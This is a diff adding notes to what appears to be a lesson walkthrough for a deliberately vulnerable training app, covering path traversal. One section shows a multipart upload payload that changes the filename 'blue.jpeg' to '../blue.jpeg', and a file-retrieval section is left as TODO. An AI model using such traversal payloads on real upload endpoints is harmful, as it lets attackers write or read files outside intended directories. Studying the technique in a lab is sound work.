@@ -469,3 +469,26 @@ Full Name: `../test`
 ### 3. Path traversal while uploading files
 
 TODO
+
+### 4. Path traversal while uploading files
+
+Exploit:
+
+```
+Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="blue.jpeg"
+
+```
+
+to
+
+```
+Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../blue.jpeg"
+```
+
+#### 5. Retrieving other files with a path traversal
+
+Retrieve file with name `path-traversal-secret.jpg`.
+
+Exploit:
+
+TODO
